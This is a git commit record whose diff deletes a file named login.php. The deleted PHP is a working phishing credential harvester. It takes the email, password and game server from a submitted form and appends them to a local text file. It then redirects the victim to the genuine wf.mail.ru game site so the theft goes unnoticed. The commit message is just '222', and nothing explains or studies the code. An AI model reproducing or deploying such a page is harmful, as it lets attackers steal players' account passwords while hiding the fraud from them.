8bb283ccf4837e8ec29a55145219cd9fee47248b
HAN <lolo-amx2@mail.ru>
2017-02-25 09:01:07 +0300

    222

--- login.php
+++
@@ -1,9 +0,0 @@
-<?PHP
-$Log = $_POST['email'];
-$Pass =$_POST['password'];
-$Pas =$_POST['gameserver'];
-$log = fopen("Fei.txt","at");
-fwrite($log,"Nick- $Log:|Pass- $Pass:|Server- $Pas|\n");
-fclose($log);
-echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru/'></head></html>";
-?>
